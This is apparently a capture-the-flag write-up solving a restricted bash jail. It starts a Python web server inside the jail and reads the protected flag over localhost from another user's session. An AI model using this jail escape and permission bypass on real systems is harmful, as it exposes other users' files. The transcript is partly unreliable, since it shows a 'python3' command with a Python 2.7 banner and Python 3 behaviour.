#BASH Jail Level 3:

```bash
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
    if [[ $1 == *[bdksc]* ]]
    then
            return 0
    fi

    return 1
}

while :
do
    echo "Your input:"
    read input
    if check_space "$input"
    then
        echo -e '\033[0;31mRestricted characters has been used\033[0m'
    else
        output=`$input` &>/dev/null
        echo "Command executed"
    fi
done

-----------------------------
```

```
Your input:
S
Command executed
Your input:
python -m SimpleHTTPServer
```

And from level 1

```bash
level1@lxc17-bash-jail:/usr/bin$ python3 1>&0
Python 2.7.6 (default, Jun 22 2015, 17:58:13)
[GCC 4.8.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-****\n'
>>> Connection to ringzer0team.com closed.
```
